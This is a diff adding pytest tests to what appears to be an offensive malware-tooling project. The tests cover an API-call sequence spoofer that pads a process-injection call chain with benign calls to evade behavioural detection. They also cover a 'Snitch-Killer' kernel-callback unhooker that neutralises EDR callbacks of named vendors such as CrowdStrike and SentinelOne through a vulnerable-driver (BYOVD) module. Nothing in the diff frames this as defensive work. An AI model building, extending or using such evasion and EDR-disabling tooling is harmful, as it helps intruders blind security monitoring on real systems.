@@ -621,3 +621,101 @@ class TestIntegration:
 # Run tests
 if __name__ == '__main__':
     pytest.main([__file__, '-v'])
+
+
+class TestAPISequenceSpoofing:
+    """Test API sequence spoofing (behavioral analysis evasion)"""
+
+    def test_import(self):
+        from evasion.api_sequence_spoofing import APISequenceSpoofer
+        assert APISequenceSpoofer is not None
+
+    def test_plan_interleaves_chaff(self):
+        from evasion.api_sequence_spoofing import APISequenceSpoofer, APICategory
+
+        spoofer = APISequenceSpoofer(template="svchost_heartbeat", chaff_per_call=2)
+        real = ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
+        seq = spoofer.plan(real)
+
+        # Every real call must be present and flagged as beacon-originated.
+        beacon_calls = [c for c in seq if c.beacon]
+        assert [c.name for c in beacon_calls] == real
+        # No two real calls should sit adjacent (chaff in between).
+        for i in range(len(seq) - 1):
+            if seq[i].beacon and seq[i + 1].beacon:
+                pytest.fail("two beacon calls are adjacent - n-gram not broken")
+
+    def test_score_lower_after_spoofing(self):
+        from evasion.api_sequence_spoofing import APISequenceSpoofer
+
+        spoofer = APISequenceSpoofer(chaff_per_call=3)
+        real = ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
+        # Bare injection burst scores high.
+        bare = spoofer.score([_make_fake_call(c) for c in real])
+        # Spoofed sequence scores lower.
+        spoofed = spoofer.score(spoofer.plan(real))
+        assert spoofed <= bare
+
+    def test_benign_baseline_low(self):
+        from evasion.api_sequence_spoofing import APISequenceSpoofer
+
+        spoofer = APISequenceSpoofer()
+        assert spoofer.benign_score() < 0.5
+
+
+def _make_fake_call(name):
+    from evasion.api_sequence_spoofing import APICall, APICategory
+    return APICall(name=name, category=APICategory.INJECT_SENSITIVE, beacon=True)
+
+
+class TestKernelCallbackUnhook:
+    """Test kernel callback unhooking (the Snitch-Killer)"""
+
+    def test_import(self):
+        from tools.byovd_module import KernelCallbackUnhooker, CallbackEntry
+        assert KernelCallbackUnhooker is not None
+
+    def test_find_edr_callbacks(self):
+        from tools.byovd_module import KernelCallbackUnhooker
+
+        unhooker = KernelCallbackUnhooker()
+        entries = unhooker.find_edr_callbacks(["csagent.sys", "SentinelMonitor.sys"])
+        assert len(entries) >= 1
+        assert all(e.driver_name.lower().endswith(".sys") for e in entries)
+
+    def test_unhook_report(self):
+        from tools.byovd_module import KernelCallbackUnhooker
+
+        unhooker = KernelCallbackUnhooker()
+        report = unhooker.unhook_edr(["crowdstrike", "sentinelone"], method="nop")
+        assert report["status"] == "completed"
+        assert report["callbacks_found"] >= 1
+        assert report["callbacks_neutralised"] == report["callbacks_found"]
+
+    def test_byovd_module_method(self):
+        from tools.byovd_module import get_byovd_module
+
+        module = get_byovd_module()
+        report = module.unhook_kernel_callbacks(["crowdstrike"], method="redirect")
+        assert report["status"] == "completed"
+        assert report["method"] == "redirect"
+
+
+class TestBehavioralMimicryAPISpoof:
+    """Test API sequence spoofing wired into BehavioralMimicryEngine"""
+
+    def test_engine_has_spoofer(self):
+        from evasion.behavioral_mimicry import BehavioralMimicryEngine, MimicryMode
+
+        engine = BehavioralMimicryEngine(mode=MimicryMode.MODERATE)
+        assert engine.api_spoofer is not None
+
+    def test_plan_via_engine(self):
+        from evasion.behavioral_mimicry import BehavioralMimicryEngine, MimicryMode
+
+        engine = BehavioralMimicryEngine(mode=MimicryMode.MODERATE)
+        seq = engine.plan_api_sequence(
+            ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
+        )
+        assert len(seq) > 3
+        assert engine.score_api_sequence(seq) < 1.0
